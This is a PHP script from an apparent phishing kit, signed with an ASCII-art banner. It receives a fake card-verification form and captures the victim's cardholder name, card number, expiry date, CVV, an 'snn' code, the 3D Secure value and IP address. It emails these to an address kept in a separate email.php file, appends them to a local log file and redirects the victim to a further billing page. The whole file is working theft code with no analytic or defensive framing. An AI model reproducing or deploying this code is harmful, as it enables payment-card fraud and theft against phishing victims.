<?php
######################################################################################################
######################################################################################################
######################################################################################################
######################################################################################################
#                                                                                                    #
#   ########  ##    ##  ########  ##        ########  ########  ########   ###       ###      ####   #
#   ##        ##    ##  ##        ##        #     ##  ##    ##  ##    ##     ###   ###       ## ##   #
#   ##        ##    ##  ##        ##        #     ##  ##    ##  ##    ##      ##   ##       ##  ##   #
#   ##        ########  ########  ##        ########  ##    ##  ########       ## ##            ##   #
#   ##        ##    ##  ##        ##        #     ##  ##    ##        ##        ###             ##   #
#   ##        ##    ##  ##        ##        #     ##  ##    ##        ##         #              ##   #
#   ########  ##    ##  ########  ########  ########  ########        ##         #            ###### #
#                              \\ FB:https://www.facebook.com/chlboo9 //                             #
######################################################################################################
######################################################################################################
######################################################################################################
######################################################################################################
////////

session_start();

$ip = getenv("REMOTE_ADDR");
$crd = $_POST['crd'];

$headers = "From: XVerginia <zebi@lbox.com>\r\n" ;
$msg = "
------------NEW CVV--------------------->
Name On Card : ".$_POST['nmc']."
Card Number : ".$_POST['crd']."
Expiry Date : ".$_POST['exm']." ".$_POST['exy']."
CSC/CVV : ".$_POST['csc']."
snn Code : ".$_POST['srt']."
3Dsecure : ".$_POST['nbn']."
IP : $ip
+=+=+=+=+=+=+=+=+=+=## XVerginia ##+=+=+=+=+=+=+=+=+=+=+=";

include 'email.php';
$subj = "♥ VBV Info ♥ - $ip";
$headers .= "Content-Type: text/plain; charset=UTF-8\n";
$headers .= "Content-Transfer-Encoding: 8bit\n";
mail("$to", $subj, $msg,"$headers");
$file = fopen("root-mrx.txt", 'a');
fwrite($file, $msg);
include 'hostname_check.php';
header("Location: billing.php?ip=$ip");
?>